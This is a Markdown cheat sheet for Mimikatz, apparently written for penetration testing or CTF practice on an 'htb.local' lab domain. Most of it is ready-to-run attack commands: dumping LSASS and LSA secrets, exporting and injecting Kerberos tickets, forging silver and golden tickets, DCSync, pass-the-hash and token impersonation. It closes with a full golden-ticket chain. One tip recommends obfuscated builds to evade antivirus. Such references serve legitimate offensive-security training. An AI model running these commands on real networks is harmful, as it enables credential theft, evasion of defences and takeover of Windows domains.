# Mimikatz

!!! tip "Tip"
    Always run `privilege::debug` first before any dump commands — without it, most commands fail silently. If you get `ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061`, you're not running as admin or token impersonation failed.

!!! warning "Watch out"
    Mimikatz is heavily detected. Use obfuscated versions (`Invoke-Mimikatz` from PowerSploit, or `mimikatz_trunk` with custom compilation) on systems with AV. The PyPy port `pypykatz` runs without dropping a binary.

## Setup

Run from an elevated prompt on a domain-joined Windows machine (cmd or PowerShell):

```cmd
privilege::debug
token::elevate
```

---

## 1. Dump Credentials from LSASS (Memory)

```mimikatz
sekurlsa::logonpasswords
```

Lists credentials currently in memory — including NTLM hashes, clear-text passwords (if cached), and Kerberos TGT info.

When you find a valid username and NTLM hash, attempt to crack it with hashcat. If unable to crack, use `evil-winrm` to perform a PtH attack and move laterally.

---

## 2. Dump Cached Kerberos Tickets

```mimikatz
kerberos::list
```

Extract `.kirbi` ticket files:

```mimikatz
kerberos::list /export
```

---

## 3. Inject a Ticket (Pass-the-Ticket / PTT)

Load `.kirbi` ticket into memory:

```mimikatz
kerberos::ptt ticket.kirbi
```

Confirm with:

```cmd
klist
```

---

## 4. Silver Ticket Creation

Prerequisites: NTLM hash of service account, domain name, domain SID, service SPN.

```mimikatz
kerberos::golden /user:<user> /domain:<domain> /sid:<domain-SID> /rc4:<hash> /service:<service> /target:<FQDN> /ptt
```

**Example:**

```mimikatz
kerberos::golden /user:websvc /domain:htb.local /sid:S-1-5-21-123456789-321654987-456987123 /rc4:9f4b4f9bffe88542acb6ea30e51b1a23 /service:HTTP /target:web01.htb.local /ptt
```

---

## 5. Golden Ticket Creation

Prerequisites: NTLM hash of `krbtgt`, domain SID, domain name.

```mimikatz
kerberos::golden /user:<user> /domain:<domain> /sid:<SID> /krbtgt:<hash> /ptt
```

**Example:**

```mimikatz
kerberos::golden /user:administrator /domain:htb.local /sid:S-1-5-21-123456789-321654987-456987123 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
```

---

## 6. DCSync Attack (Dump Hashes Without Touching LSASS)

### Dump Administrator Hash

```mimikatz
lsadump::dcsync /domain:htb.local /user:administrator
```

### Dump `krbtgt` Hash (for Golden Ticket)

```mimikatz
lsadump::dcsync /domain:htb.local /user:krbtgt
```

> Requires **Replicating Directory Changes** privilege.

---

## 7. LSA Secrets (Service Account & System Info Dump)

```mimikatz
lsadump::secrets
```

Extracts service account credentials, saved RDP credentials, and cached scheduled task passwords.

---

## 8. Extract Domain Cached Credentials (DCC)

```mimikatz
lsadump::cache
```

Useful for offline cracking using hashcat mode `2100`.

---

## 9. Pass-the-Hash (PTH) via Token Replacement

```mimikatz
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:cmd.exe
```

**Example:**

```mimikatz
sekurlsa::pth /user:svc_sql /domain:htb.local /ntlm:ccf749a1e26e51b6e07ed92d6d68f762 /run:cmd.exe
```

---

## 10. Token Impersonation

List tokens:

```mimikatz
token::list
```

Impersonate SYSTEM token:

```mimikatz
token::elevate
```

Impersonate another user token:

```mimikatz
token::impersonate <token_id>
```

---

## 11. Dump All Data in One Shot

```mimikatz
log
privilege::debug
sekurlsa::logonpasswords
lsadump::dcsync /user:krbtgt
kerberos::list /export
```

---

## Full Golden Ticket Attack Chain

```powershell
# From SYSTEM shell on domain-joined box:
privilege::debug
lsadump::dcsync /domain:htb.local /user:krbtgt
kerberos::golden /user:admin /domain:htb.local /sid:S-1-5-21-xxx /krbtgt:<hash> /ptt
klist
PsExec.exe \\dc01 cmd.exe
```

---

## Summary: Common Use Cases

| Objective | Command |
|---|---|
| Dump LSASS creds | `sekurlsa::logonpasswords` |
| Extract krbtgt hash | `lsadump::dcsync /user:krbtgt` |
| Create Golden Ticket | `kerberos::golden /krbtgt:<hash> /ptt` |
| Create Silver Ticket | `kerberos::golden /rc4:<hash> /service:<svc>` |
| PTT any `.kirbi` ticket | `kerberos::ptt <ticket.kirbi>` |
| List current tickets | `kerberos::list` |
| Dump LSA secrets | `lsadump::secrets` |
| Impersonate token | `token::impersonate <id>` |
